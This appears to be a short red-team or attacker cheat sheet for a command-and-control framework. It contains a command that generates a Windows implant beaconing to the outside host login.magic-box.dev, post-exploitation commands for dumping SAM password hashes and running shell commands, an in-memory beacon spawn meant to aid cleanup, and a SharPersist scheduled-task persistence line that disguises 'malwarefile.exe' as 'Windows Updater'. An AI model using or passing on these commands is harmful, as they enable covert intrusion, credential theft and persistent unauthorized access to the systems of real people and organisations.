## Beacons/Sessions
* generate a session w/ 443 or 80 as a fallback `generate --mtls login.magic-box.dev:443,login.magic-box.dev:80,login.magic-box.dev:21 --os windows --arch amd64`

# PostEx
* hashdump - dump sam hashes
* sa-whoami - current user and privs
* `execute -o cmd /c "command"` - runs a command and captures output
* remote-shspawnas - spins off another beacon in memory so you can clean up

## Sharpersist
* sharpersist -- -t schtask -c "C:\Windows\Tasks\malwarefile.exe" -n "Windows Updater" -m add